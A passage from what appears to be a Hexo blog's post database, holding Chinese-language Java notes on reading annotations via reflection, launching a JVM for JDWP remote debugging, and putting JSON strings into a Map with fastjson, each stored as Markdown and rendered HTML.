System.out.println(myanno);\n        System.out.println(annos[0]);\n    }\n}\n```\n>   methods.getAnnotations();是获取所有注解\n>\n>   methods.getAnnotation(Myanno.class);是获取指定注解\n\n\n\n###### 获取编译阶段的注解\n编译时注解指的是@Retention的值为CLASS的注解\n\n自定义类继承 AbstractProcessor类；\n\n重写其中的 process 函数。\n\n编译器在编译时会自动查找所有继承自 AbstractProcessor 的类，然后调用他们的 process 方法。\n\n[注解获取方式](http://www.open-open.com/lib/view/open1423471786764.html)\n\n###### 获取运行时注解","source":"_posts/Java/Java注解获取.md","raw":"---\ntitle: Java注解获取\ndate: 2018-07-10 21:09:19\ntags: Java\n---\n### java 注解\n[注解见另一篇笔记](http://blog.csdn.net/boomhankers/article/details/70768349)\n\n##### 注解按保存范围阶段分类\n先看一个栗子,下面是一个自定义的注解:\n\n```\n@Target({TYPE, FIELD, METHOD, PARAMETER, CONSTRUCTOR, LOCAL_VARIABLE})\n@Retention(RetentionPolicy.SOURCE)\npublic @interface myAnnotation {\n    String[] value();\n```\n@Retention()注解，表示这个自定义注解的保存范围\n\n@Retention(RetentionPolicy.SOURCE)表示保存在源文件中\n\n分类：\n- ==*SOURCE*==:   此注解只会保存在源文件中，也就是.java文件，编译之后不会存在编译好的.class文件中\n- *==CLASS==*:  默认范围 此注解会保留在源文件和编译后的文件中，但不会被加载到虚拟机中\n- *==RUNTIME==*: 会保留在源文件和编译之后的文件中，运行时会被加载到JVM虚拟机中\n\n\n### 获取注解\n\n##### 某一个类中的注解\n先通过反射机制获取类，然后获取指定的方法和方法的注解.\n\n*这种方法要获取的注解一定要是运行时注解*\n```\npackage com.learn.controller;\n\nimport java.lang.annotation.Annotation;\nimport java.lang.annotation.Retention;\nimport java.lang.annotation.RetentionPolicy;\nimport java.lang.annotation.Target;\nimport java.lang.reflect.Method;\n\nimport static java.lang.annotation.ElementType.*;\n\n@Target({TYPE, FIELD, METHOD, PARAMETER, CONSTRUCTOR, LOCAL_VARIABLE})\n@Retention(RetentionPolicy.RUNTIME)\npublic @interface Myanno {\n    String value();\n}\n\nclass Myanotaion {\n    @Myanno(\"a method\")\n    @Override\n    public String toString(){\n        return \"llalal\";\n    }\n}\nclass GetAnno{\n    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException {\n        Class<?> c = Class.forName(\"com.learn.controller.Myanotaion\");\n        Method methods = c.getMethod(\"toString\");\n        Annotation annos[] = methods.getAnnotations();\n        Annotation myanno = methods.getAnnotation(Myanno.class);\n        System.out.println(myanno);\n        System.out.println(annos[0]);\n    }\n}\n```\n>   methods.getAnnotations();是获取所有注解\n>\n>   methods.getAnnotation(Myanno.class);是获取指定注解\n\n\n\n###### 获取编译阶段的注解\n编译时注解指的是@Retention的值为CLASS的注解\n\n自定义类继承 AbstractProcessor类；\n\n重写其中的 process 函数。\n\n编译器在编译时会自动查找所有继承自 AbstractProcessor 的类，然后调用他们的 process 方法。\n\n[注解获取方式](http://www.open-open.com/lib/view/open1423471786764.html)\n\n###### 获取运行时注解","slug":"Java/Java注解获取","published":1,"updated":"2018-07-10T13:10:09.891Z","_id":"cjjedmh9j002q0gtjrvtnjcj0","comments":1,"layout":"post","photos":[],"link":"","content":"<h3 id=\"java-注解\"><a href=\"#java-注解\" class=\"headerlink\" title=\"java 注解\"></a>java 注解</h3><p><a href=\"http://blog.csdn.net/boomhankers/article/details/70768349\" target=\"_blank\" rel=\"noopener\">注解见另一篇笔记</a></p>\n<h5 id=\"注解按保存范围阶段分类\"><a href=\"#注解按保存范围阶段分类\" class=\"headerlink\" title=\"注解按保存范围阶段分类\"></a>注解按保存范围阶段分类</h5><p>先看一个栗子,下面是一个自定义的注解:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@Target(&#123;TYPE, FIELD, METHOD, PARAMETER, CONSTRUCTOR, LOCAL_VARIABLE&#125;)</span><br><span class=\"line\">@Retention(RetentionPolicy.SOURCE)</span><br><span class=\"line\">public @interface myAnnotation &#123;</span><br><span class=\"line\">    String[] value();</span><br></pre></td></tr></table></figure>\n<p>@Retention()注解，表示这个自定义注解的保存范围</p>\n<p>@Retention(RetentionPolicy.SOURCE)表示保存在源文件中</p>\n<p>分类：</p>\n<ul>\n<li>==<em>SOURCE</em>==:   此注解只会保存在源文件中，也就是.java文件，编译之后不会存在编译好的.class文件中</li>\n<li><em>==CLASS==</em>:  默认范围 此注解会保留在源文件和编译后的文件中，但不会被加载到虚拟机中</li>\n<li><em>==RUNTIME==</em>: 会保留在源文件和编译之后的文件中，运行时会被加载到JVM虚拟机中</li>\n</ul>\n<h3 id=\"获取注解\"><a href=\"#获取注解\" class=\"headerlink\" title=\"获取注解\"></a>获取注解</h3><h5 id=\"某一个类中的注解\"><a href=\"#某一个类中的注解\" class=\"headerlink\" title=\"某一个类中的注解\"></a>某一个类中的注解</h5><p>先通过反射机制获取类，然后获取指定的方法和方法的注解.</p>\n<p><em>这种方法要获取的注解一定要是运行时注解</em><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package com.learn.controller;</span><br><span class=\"line\"></span><br><span class=\"line\">import java.lang.annotation.Annotation;</span><br><span class=\"line\">import java.lang.annotation.Retention;</span><br><span class=\"line\">import java.lang.annotation.RetentionPolicy;</span><br><span class=\"line\">import java.lang.annotation.Target;</span><br><span class=\"line\">import java.lang.reflect.Method;</span><br><span class=\"line\"></span><br><span class=\"line\">import static java.lang.annotation.ElementType.*;</span><br><span class=\"line\"></span><br><span class=\"line\">@Target(&#123;TYPE, FIELD, METHOD, PARAMETER, CONSTRUCTOR, LOCAL_VARIABLE&#125;)</span><br><span class=\"line\">@Retention(RetentionPolicy.RUNTIME)</span><br><span class=\"line\">public @interface Myanno &#123;</span><br><span class=\"line\">    String value();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">class Myanotaion &#123;</span><br><span class=\"line\">    @Myanno(&quot;a method&quot;)</span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public String toString()&#123;</span><br><span class=\"line\">        return &quot;llalal&quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">class GetAnno&#123;</span><br><span class=\"line\">    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException &#123;</span><br><span class=\"line\">        Class&lt;?&gt; c = Class.forName(&quot;com.learn.controller.Myanotaion&quot;);</span><br><span class=\"line\">        Method methods = c.getMethod(&quot;toString&quot;);</span><br><span class=\"line\">        Annotation annos[] = methods.getAnnotations();</span><br><span class=\"line\">        Annotation myanno = methods.getAnnotation(Myanno.class);</span><br><span class=\"line\">        System.out.println(myanno);</span><br><span class=\"line\">        System.out.println(annos[0]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<blockquote>\n<p>  methods.getAnnotations();是获取所有注解</p>\n<p>  methods.getAnnotation(Myanno.class);是获取指定注解</p>\n</blockquote>\n<h6 id=\"获取编译阶段的注解\"><a href=\"#获取编译阶段的注解\" class=\"headerlink\" title=\"获取编译阶段的注解\"></a>获取编译阶段的注解</h6><p>编译时注解指的是@Retention的值为CLASS的注解</p>\n<p>自定义类继承 AbstractProcessor类；</p>\n<p>重写其中的 process 函数。</p>\n<p>编译器在编译时会自动查找所有继承自 AbstractProcessor 的类，然后调用他们的 process 方法。</p>\n<p><a href=\"http://www.open-open.com/lib/view/open1423471786764.html\" target=\"_blank\" rel=\"noopener\">注解获取方式</a></p>\n<h6 id=\"获取运行时注解\"><a href=\"#获取运行时注解\" class=\"headerlink\" title=\"获取运行时注解\"></a>获取运行时注解</h6>","site":{"data":{}},"excerpt":"","more":"<h3 id=\"java-注解\"><a href=\"#java-注解\" class=\"headerlink\" title=\"java 注解\"></a>java 注解</h3><p><a href=\"http://blog.csdn.net/boomhankers/article/details/70768349\" target=\"_blank\" rel=\"noopener\">注解见另一篇笔记</a></p>\n<h5 id=\"注解按保存范围阶段分类\"><a href=\"#注解按保存范围阶段分类\" class=\"headerlink\" title=\"注解按保存范围阶段分类\"></a>注解按保存范围阶段分类</h5><p>先看一个栗子,下面是一个自定义的注解:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@Target(&#123;TYPE, FIELD, METHOD, PARAMETER, CONSTRUCTOR, LOCAL_VARIABLE&#125;)</span><br><span class=\"line\">@Retention(RetentionPolicy.SOURCE)</span><br><span class=\"line\">public @interface myAnnotation &#123;</span><br><span class=\"line\">    String[] value();</span><br></pre></td></tr></table></figure>\n<p>@Retention()注解，表示这个自定义注解的保存范围</p>\n<p>@Retention(RetentionPolicy.SOURCE)表示保存在源文件中</p>\n<p>分类：</p>\n<ul>\n<li>==<em>SOURCE</em>==:   此注解只会保存在源文件中，也就是.java文件，编译之后不会存在编译好的.class文件中</li>\n<li><em>==CLASS==</em>:  默认范围 此注解会保留在源文件和编译后的文件中，但不会被加载到虚拟机中</li>\n<li><em>==RUNTIME==</em>: 会保留在源文件和编译之后的文件中，运行时会被加载到JVM虚拟机中</li>\n</ul>\n<h3 id=\"获取注解\"><a href=\"#获取注解\" class=\"headerlink\" title=\"获取注解\"></a>获取注解</h3><h5 id=\"某一个类中的注解\"><a href=\"#某一个类中的注解\" class=\"headerlink\" title=\"某一个类中的注解\"></a>某一个类中的注解</h5><p>先通过反射机制获取类，然后获取指定的方法和方法的注解.</p>\n<p><em>这种方法要获取的注解一定要是运行时注解</em><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package com.learn.controller;</span><br><span class=\"line\"></span><br><span class=\"line\">import java.lang.annotation.Annotation;</span><br><span class=\"line\">import java.lang.annotation.Retention;</span><br><span class=\"line\">import java.lang.annotation.RetentionPolicy;</span><br><span class=\"line\">import java.lang.annotation.Target;</span><br><span class=\"line\">import java.lang.reflect.Method;</span><br><span class=\"line\"></span><br><span class=\"line\">import static java.lang.annotation.ElementType.*;</span><br><span class=\"line\"></span><br><span class=\"line\">@Target(&#123;TYPE, FIELD, METHOD, PARAMETER, CONSTRUCTOR, LOCAL_VARIABLE&#125;)</span><br><span class=\"line\">@Retention(RetentionPolicy.RUNTIME)</span><br><span class=\"line\">public @interface Myanno &#123;</span><br><span class=\"line\">    String value();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">class Myanotaion &#123;</span><br><span class=\"line\">    @Myanno(&quot;a method&quot;)</span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public String toString()&#123;</span><br><span class=\"line\">        return &quot;llalal&quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">class GetAnno&#123;</span><br><span class=\"line\">    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException &#123;</span><br><span class=\"line\">        Class&lt;?&gt; c = Class.forName(&quot;com.learn.controller.Myanotaion&quot;);</span><br><span class=\"line\">        Method methods = c.getMethod(&quot;toString&quot;);</span><br><span class=\"line\">        Annotation annos[] = methods.getAnnotations();</span><br><span class=\"line\">        Annotation myanno = methods.getAnnotation(Myanno.class);</span><br><span class=\"line\">        System.out.println(myanno);</span><br><span class=\"line\">        System.out.println(annos[0]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<blockquote>\n<p>  methods.getAnnotations();是获取所有注解</p>\n<p>  methods.getAnnotation(Myanno.class);是获取指定注解</p>\n</blockquote>\n<h6 id=\"获取编译阶段的注解\"><a href=\"#获取编译阶段的注解\" class=\"headerlink\" title=\"获取编译阶段的注解\"></a>获取编译阶段的注解</h6><p>编译时注解指的是@Retention的值为CLASS的注解</p>\n<p>自定义类继承 AbstractProcessor类；</p>\n<p>重写其中的 process 函数。</p>\n<p>编译器在编译时会自动查找所有继承自 AbstractProcessor 的类，然后调用他们的 process 方法。</p>\n<p><a href=\"http://www.open-open.com/lib/view/open1423471786764.html\" target=\"_blank\" rel=\"noopener\">注解获取方式</a></p>\n<h6 id=\"获取运行时注解\"><a href=\"#获取运行时注解\" class=\"headerlink\" title=\"获取运行时注解\"></a>获取运行时注解</h6>"},{"title":"Java程序远程Debug","date":"2018-07-10T13:09:19.000Z","_content":"#### 0.环境\n远程服务器（本地也可以应该）\n\n远程服务器JDK环境\n\n本地IDE（这里是idea）\n#### 1.准备程序\n先准备一个要远程debug的程序，这里新建一个test工程，并导出jar包。比如一个名叫Test的jar文件\n#### 2.远程启动\n把包放到远程服务器的目录下\n\n\n终端输入命令\n```\n java -Xdebug -Xrunjdwp:transport=dt_socket,server=y,address=\"8000\" -jar \n ```\n 终端返回下面结果说明卡伊开始debug了\n ```\n Listening for transport dt_socket at address: 8000\n ```\n 如图：\n ![image](C:\\Users\\hanqian18790\\Desktop\\youdaoIMG\\QQ截图20170523195051.png)\n#### 3.本地启动\nide上配置远程，\n\n点击Eidt Cnfigration\n\nidea配置如下：\n![image](C:\\Users\\hanqian18790\\Desktop\\youdaoIMG\\remotedebug_local.png)\n\n#### 4.参数说明\n远程调试时的一些VM参数说明如下：\nheader 1 | header 2\n---|---\n-XDebug             |  启用调试。 \n-Xnoagent            |禁用默认sun.tools.debug调试器。 \n-Djava.compiler=NONE| 禁止 JIT 编译器的加载。 \n-Xrunjdwp           | 加载JDWP的JPDA参考执行实例。 \ntransport            | 用于在调试程序和 VM 使用的进程之间通讯。 \ndt_socket            | 套接字传输。 \ndt_shmem             | 共享内存传输，仅限于 Windows。\nserver=y/n           | VM是否需要作为调试服务器执行。\naddress        | 调试服务器的端口号，客户端用来连接服务器的端口号。 \nsuspend=y/n          | 是否在调试客户端建立连接之后启动 VM 。 \n\n\n","source":"_posts/Java/Java程序远程Debug.md","raw":"---\ntitle: Java程序远程Debug\ndate: 2018-07-10 21:09:19\ntags: Java\n---\n#### 0.环境\n远程服务器（本地也可以应该）\n\n远程服务器JDK环境\n\n本地IDE（这里是idea）\n#### 1.准备程序\n先准备一个要远程debug的程序，这里新建一个test工程，并导出jar包。比如一个名叫Test的jar文件\n#### 2.远程启动\n把包放到远程服务器的目录下\n\n\n终端输入命令\n```\n java -Xdebug -Xrunjdwp:transport=dt_socket,server=y,address=\"8000\" -jar \n ```\n 终端返回下面结果说明卡伊开始debug了\n ```\n Listening for transport dt_socket at address: 8000\n ```\n 如图：\n ![image](C:\\Users\\hanqian18790\\Desktop\\youdaoIMG\\QQ截图20170523195051.png)\n#### 3.本地启动\nide上配置远程，\n\n点击Eidt Cnfigration\n\nidea配置如下：\n![image](C:\\Users\\hanqian18790\\Desktop\\youdaoIMG\\remotedebug_local.png)\n\n#### 4.参数说明\n远程调试时的一些VM参数说明如下：\nheader 1 | header 2\n---|---\n-XDebug             |  启用调试。 \n-Xnoagent            |禁用默认sun.tools.debug调试器。 \n-Djava.compiler=NONE| 禁止 JIT 编译器的加载。 \n-Xrunjdwp           | 加载JDWP的JPDA参考执行实例。 \ntransport            | 用于在调试程序和 VM 使用的进程之间通讯。 \ndt_socket            | 套接字传输。 \ndt_shmem             | 共享内存传输，仅限于 Windows。\nserver=y/n           | VM是否需要作为调试服务器执行。\naddress        | 调试服务器的端口号，客户端用来连接服务器的端口号。 \nsuspend=y/n          | 是否在调试客户端建立连接之后启动 VM 。 \n\n\n","slug":"Java/Java程序远程Debug","published":1,"updated":"2018-07-10T13:10:09.892Z","_id":"cjjedmh9l002t0gtjg56zwnno","comments":1,"layout":"post","photos":[],"link":"","content":"<h4 id=\"0-环境\"><a href=\"#0-环境\" class=\"headerlink\" title=\"0.环境\"></a>0.环境</h4><p>远程服务器（本地也可以应该）</p>\n<p>远程服务器JDK环境</p>\n<p>本地IDE（这里是idea）</p>\n<h4 id=\"1-准备程序\"><a href=\"#1-准备程序\" class=\"headerlink\" title=\"1.准备程序\"></a>1.准备程序</h4><p>先准备一个要远程debug的程序，这里新建一个test工程，并导出jar包。比如一个名叫Test的jar文件</p>\n<h4 id=\"2-远程启动\"><a href=\"#2-远程启动\" class=\"headerlink\" title=\"2.远程启动\"></a>2.远程启动</h4><p>把包放到远程服务器的目录下</p>\n<p>终端输入命令<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">java -Xdebug -Xrunjdwp:transport=dt_socket,server=y,address=&quot;8000&quot; -jar</span><br></pre></td></tr></table></figure></p>\n<p> 终端返回下面结果说明卡伊开始debug了<br> <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Listening for transport dt_socket at address: 8000</span><br></pre></td></tr></table></figure></p>\n<p> 如图：<br> <img src=\"C:\\Users\\hanqian18790\\Desktop\\youdaoIMG\\QQ截图20170523195051.png\" alt=\"image\"></p>\n<h4 id=\"3-本地启动\"><a href=\"#3-本地启动\" class=\"headerlink\" title=\"3.本地启动\"></a>3.本地启动</h4><p>ide上配置远程，</p>\n<p>点击Eidt Cnfigration</p>\n<p>idea配置如下：<br><img src=\"C:\\Users\\hanqian18790\\Desktop\\youdaoIMG\\remotedebug_local.png\" alt=\"image\"></p>\n<h4 id=\"4-参数说明\"><a href=\"#4-参数说明\" class=\"headerlink\" title=\"4.参数说明\"></a>4.参数说明</h4><p>远程调试时的一些VM参数说明如下：<br>header 1 | header 2<br>—|—<br>-XDebug             |  启用调试。<br>-Xnoagent            |禁用默认sun.tools.debug调试器。<br>-Djava.compiler=NONE| 禁止 JIT 编译器的加载。<br>-Xrunjdwp           | 加载JDWP的JPDA参考执行实例。<br>transport            | 用于在调试程序和 VM 使用的进程之间通讯。<br>dt_socket            | 套接字传输。<br>dt_shmem             | 共享内存传输，仅限于 Windows。<br>server=y/n           | VM是否需要作为调试服务器执行。<br>address        | 调试服务器的端口号，客户端用来连接服务器的端口号。<br>suspend=y/n          | 是否在调试客户端建立连接之后启动 VM 。 </p>\n","site":{"data":{}},"excerpt":"","more":"<h4 id=\"0-环境\"><a href=\"#0-环境\" class=\"headerlink\" title=\"0.环境\"></a>0.环境</h4><p>远程服务器（本地也可以应该）</p>\n<p>远程服务器JDK环境</p>\n<p>本地IDE（这里是idea）</p>\n<h4 id=\"1-准备程序\"><a href=\"#1-准备程序\" class=\"headerlink\" title=\"1.准备程序\"></a>1.准备程序</h4><p>先准备一个要远程debug的程序，这里新建一个test工程，并导出jar包。比如一个名叫Test的jar文件</p>\n<h4 id=\"2-远程启动\"><a href=\"#2-远程启动\" class=\"headerlink\" title=\"2.远程启动\"></a>2.远程启动</h4><p>把包放到远程服务器的目录下</p>\n<p>终端输入命令<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">java -Xdebug -Xrunjdwp:transport=dt_socket,server=y,address=&quot;8000&quot; -jar</span><br></pre></td></tr></table></figure></p>\n<p> 终端返回下面结果说明卡伊开始debug了<br> <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Listening for transport dt_socket at address: 8000</span><br></pre></td></tr></table></figure></p>\n<p> 如图：<br> <img src=\"C:\\Users\\hanqian18790\\Desktop\\youdaoIMG\\QQ截图20170523195051.png\" alt=\"image\"></p>\n<h4 id=\"3-本地启动\"><a href=\"#3-本地启动\" class=\"headerlink\" title=\"3.本地启动\"></a>3.本地启动</h4><p>ide上配置远程，</p>\n<p>点击Eidt Cnfigration</p>\n<p>idea配置如下：<br><img src=\"C:\\Users\\hanqian18790\\Desktop\\youdaoIMG\\remotedebug_local.png\" alt=\"image\"></p>\n<h4 id=\"4-参数说明\"><a href=\"#4-参数说明\" class=\"headerlink\" title=\"4.参数说明\"></a>4.参数说明</h4><p>远程调试时的一些VM参数说明如下：<br>header 1 | header 2<br>—|—<br>-XDebug             |  启用调试。<br>-Xnoagent            |禁用默认sun.tools.debug调试器。<br>-Djava.compiler=NONE| 禁止 JIT 编译器的加载。<br>-Xrunjdwp           | 加载JDWP的JPDA参考执行实例。<br>transport            | 用于在调试程序和 VM 使用的进程之间通讯。<br>dt_socket            | 套接字传输。<br>dt_shmem             | 共享内存传输，仅限于 Windows。<br>server=y/n           | VM是否需要作为调试服务器执行。<br>address        | 调试服务器的端口号，客户端用来连接服务器的端口号。<br>suspend=y/n          | 是否在调试客户端建立连接之后启动 VM 。 </p>\n"},{"title":"Map中插入JSON类型的value","date":"2018-07-10T13:09:19.000Z","_content":"### 向一个map中插入JSON格式的value\n\n如果直接用字符串拼接成json需要转译字符“\\”,\n\n比如：\n```\n map.put(\"hello\",\"{\\\"he\\\",\\\"llo\\\"}\");\n```\n\n如果不加入转译字符就会报错，但是这样根据key取value的时候就会输出转译字符，如下：\n```\n{\\\"wor\\\":\\\"ld\\\"}\"\n```\n为了能正常的输出JSON字符串需要把字符串转正json格式。\n\n使用fastjson\n```\nJSON.toJSONString(\"{\\\"wor\\\":\\\"ld\\\"}\")\n```\n代码：\n\n```\npackage com.aha\n\nimport com.alibaba.fastjson.JSON;\n\nimport java.util.HashMap;\nimport java.util.Map;\n\n/**\n * Created by han\n */\npublic class testJSON {\n    public static void main(String[] args){\n        Map<String,String> map = new HashMap<>();\n        map.put(\"hello\",\"{\\\"he\\\",\\\"llo\\\"}\");\n        map.put(\"world\", JSON.toJSONString(\"{\\\"wor\\\":\\\"ld\\\"}\"));\n        for (String key : map.keySet()) {\n            System.out.println(\">>>>>>>>>>>>>\"+map.get(key));\n        }\n    }\n}\n\n```\n输出如下：\n```\n\"{\\\"wor\\\":\\\"ld\\\"}\"\n\n{\"he\",\"llo\"}\n```","source":"_posts/Java/Map中插入JSON类型的value.md","raw":"---\ntitle: Map中插入JSON类型的value\ndate: 2018-07-10 21:09:19\ntags: Java\n---\n### 向一个map中插入JSON格式的value\n\n如果直接用字符串拼接成json需要转译字符“\\”,\n\n比如：\n```\n map.put(\"hello\",\"{\\\"he\\\",\\\"llo\\\"}\");\n```\n\n如果不加入转译字符就会报错，但是这样根据key取value的时候就会输出转译字符，如下：\n```\n{\\\"wor\\\":\\\"ld\\\"}\"\n```\n为了能正常的输出JSON字符串需要把字符串转正json格式。\n\n使用fastjson\n```\nJSON.toJSONString(\"{\\\"wor\\\":\\\"ld\\\"}\")\n```\n代码：\n\n```\npackage com.aha\n\nimport com.alibaba.fastjson.JSON;\n\nimport java.util.HashMap;\nimport java.util.Map;\n\n/**\n * Created by han\n */\npublic class testJSON {\n    public static void main(String[] args){\n        Map<String,String> map = new HashMap<>();\n        map.put(\"hello\",\"{\\\"he\\\",\\\"llo\\\"}\");\n        map.put(\"world\", JSON.toJSONString(\"{\\\"wor\\\":\\\"ld\\\"}\"));\n        for (String key : map.keySet()) {\n            System.out.println(\">>>>>>>>>>>>>\"+map.get(key));\n        }\n    }\n}\n\n```\n输出如下：\n```\n\"{\\\"wor\\\":\\\"ld\\\"}\"\n\n{\"he\",\"llo\"}\n```","slug":"Java/Map中插入JSON类型的value","published":1,"updated":"2018-07-10T13:10:09.898Z","_id":"cjjedmh9l002v0gtj956lmk0y","comments":1,"layout":"post","photos":[],"link":"","content":"<h3 id=\"向一个map中插入JSON格式的value\"><a href=\"#向一个map中插入JSON格式的value\" class=\"headerlink\" title=\"向一个map中插入JSON格式的value\"></a>向一个map中插入JSON格式的value</h3><p>如果直接用字符串拼接成json需要转译字符“\\”,</p>\n<p>比如：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">map.put(&quot;hello&quot;,&quot;&#123;\\&quot;he\\&quot;,\\&quot;llo\\&quot;&#125;&quot;);</span><br></pre></td></tr></table></figure></p>\n<p>如果不加入转译字符就会报错，但是这样根据key取value的时候就会输出转译字符，如下：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;\\&quot;wor\\&quot;:\\&quot;ld\\&quot;&#125;&quot;</span><br></pre></td></tr></table></figure></p>\n<p>为了能正常的输出JSON字符串需要把字符串转正json格式。</p>\n<p>使用fastjson<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">JSON.toJSONString(&quot;&#123;\\&quot;wor\\&quot;:\\&quot;ld\\&quot;&#125;&quot;)</span><br></pre></td></tr></table></figure></p>\n<p>代码：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package com.aha</span><br><span class=\"line\"></span><br><span class=\"line\">import com.alibaba.fastjson.JSON;</span><br><span class=\"line\"></span><br><span class=\"line\">import java.util.HashMap;</span><br><span class=\"line\">import java.util.Map;</span><br><span class=\"line\"></span><br><span class=\"line\">/**</span><br><span class=\"line\"> * Created by han</span><br><span class=\"line\"> */</span><br><span class=\"line\">public class testJSON &#123;</span><br><span class=\"line\">    public static void main(String[] args)&#123;</span><br><span class=\"line\">        Map&lt;String,String&gt; map = new HashMap&lt;&gt;();</span><br><span class=\"line\">        map.put(&quot;hello&quot;,&quot;&#123;\\&quot;he\\&quot;,\\&quot;llo\\&quot;&#125;&quot;);</span><br><span class=\"line\">        map.put(&quot;world&quot;, JSON.toJSONString(&quot;&#123;\\&quot;wor\\&quot;:\\&quot;ld\\&quot;&#125;&quot;));</span><br><span class=\"line\">        for (String key : map.keySet()) &#123;</span><br><span class=\"line\">            System.out.println(&quot;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&quot;+map.get(key));</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>输出如下：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot;&#123;\\&quot;wor\\&quot;:\\&quot;ld\\&quot;&#125;&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;&quot;he&quot;,&quot;llo&quot;&#125;</span><br></pre></td></tr></table></figure></p>\n","site":{"data":{}},"excerpt":"","more":"<h3 id=\"向一个map中插入JSON格式的value\"><a href=\"#向一个map中插入JSON格式的value\" class=\"headerlink\" title=\"向一个map中插入JSON格式的value\"></a>向一个map中插入JSON格式的value</h3><p>如果直接用字符串拼接成json需要转译字符“\\”,</p>\n<p>比如：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span 